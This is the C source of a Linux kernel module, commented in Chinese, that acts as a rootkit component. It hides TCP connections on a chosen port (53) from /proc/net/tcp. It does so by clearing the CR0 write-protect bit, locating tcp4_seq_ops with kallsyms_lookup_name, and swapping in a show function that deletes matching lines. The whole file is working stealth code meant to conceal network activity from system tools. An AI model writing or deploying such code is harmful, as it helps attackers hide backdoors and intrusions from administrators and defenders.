#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/string.h>
#include <linux/seq_file.h>
MODULE_LICENSE("GPL");

#define TMPSZ 150
#define PORT_TO_HIDE 53

/**
 * 
 */
inline void mywrite_cr0(unsigned long cr0)
{

    asm volatile("mov %0,%%cr0"
                 : "+r"(cr0));
}

/**
 * 开启写保护
 */
void enable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    mywrite_cr0(cr0);
}

/**
 * 关闭写保护
 */
void disable_write_protection(void)
{
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    mywrite_cr0(cr0);
}

// struct seq_operations {
//  void * (*start) (struct seq_file *m, loff_t *pos);
//  void (*stop) (struct seq_file *m, void *v);
//  void * (*next) (struct seq_file *m, void *v, loff_t *pos);
//  int (*show) (struct seq_file *m, void *v);
// };


//seq_operations的结构体指针，用来存放系统中的seq_operations的地址。
struct seq_operations *tcp4_seq_ops_ptr = NULL;
//tcp4_seq_show的函数指针，用来存放系统中的tcp4_seq_show函数的地址。
typedef int (*tcp4_seq_show_ptr)(struct seq_file *m, void *v);
tcp4_seq_show_ptr old_tcp4_seq_show = NULL;

char *strnstr(const char *haystack, const char *needle, size_t n)
{
    char *s = strstr(haystack, needle);
    if (s == NULL)
        return NULL;
    if (s - haystack + strlen(needle) <= n)

        return s;
    else
        return NULL;
}

int my_tcp4_seq_show(struct seq_file *seq, void *v)
{
    printk("before...");
    //do something before old api
    int old_val = (*old_tcp4_seq_show)(seq, v);
    char port[12];
    sprintf(port, "%04X", PORT_TO_HIDE);
    //查找是否含有指定端口的内容，有的话就删除掉该条tcp连接信息(一个TMPSZ)
    if (strnstr(seq->buf + seq->count - TMPSZ, port, TMPSZ))
    {
        printk("发现待隐藏端口,已删除");
        seq->count -= TMPSZ;
    }
    printk("after...");
    //do something after old api
    return old_val;
}

static int __init lkm_init(void)
{
    printk("%s\n", "Init the module...");
    //通过kallsyms_lookup_name函数来找到tcp4_seq_ops的结构体地址
    tcp4_seq_ops_ptr = (struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops");
    //打印出找到的tcp4_seq_ops的地址
    printk("tcp4_seq_ops addr is %lx.\n", tcp4_seq_ops_ptr);
    //然后使用kallsyms_lookup_name获取到tcp4_seq_show的函数地址
    old_tcp4_seq_show = (tcp4_seq_show_ptr)kallsyms_lookup_name("tcp4_seq_show");
    printk("tcp4_seq_show_ptr addr is %lx.\n", old_tcp4_seq_show);
    //比较我们找到的两个函数地址是否为同一个地址。
    printk("tcp4_seq_ops.show addr is %lx.\n", tcp4_seq_ops_ptr->show);
    //print my_tcp4_seq_show adress
    printk("my_tcp4_seq_show addr is %lx.\n", &my_tcp4_seq_show);
    //开始进行我们的hook
    if (old_tcp4_seq_show != NULL && tcp4_seq_ops_ptr != NULL)
    {
        printk("start change the tcp4_seq_ops_ptr.show addr...");
        disable_write_protection();
        //将我们自己的my_tcp4_seq_show替换掉系统中的tcp4_seq_ops_ptr->show的内容。此处会有一个坑，
        //就是你必须找到tcp4_seq_show函数地址被引用的地方
        //（即tcp4_seq_ops，然后按照系统代码所指定的结构体进行替换，否则直接用类似于求地址&或者求值*等指针操作修改tcp4_seq_show的引用地址是会报错的，具体原因得看c++语言的说明了）
        tcp4_seq_ops_ptr->show = (tcp4_seq_show_ptr)(&my_tcp4_seq_show);
        enable_write_protection();
    }
    return 0;
}

static void __exit lkm_exit(void)
{
    printk(KERN_INFO " module removed\n");
    disable_write_protection();
    tcp4_seq_ops_ptr->show = old_tcp4_seq_show;
    enable_write_protection();
}

module_init(lkm_init);
module_exit(lkm_exit);